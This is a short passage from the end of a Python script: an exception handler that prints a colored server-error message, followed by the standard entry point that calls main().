        print(f"\n{Fore.RED}❌ Server error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
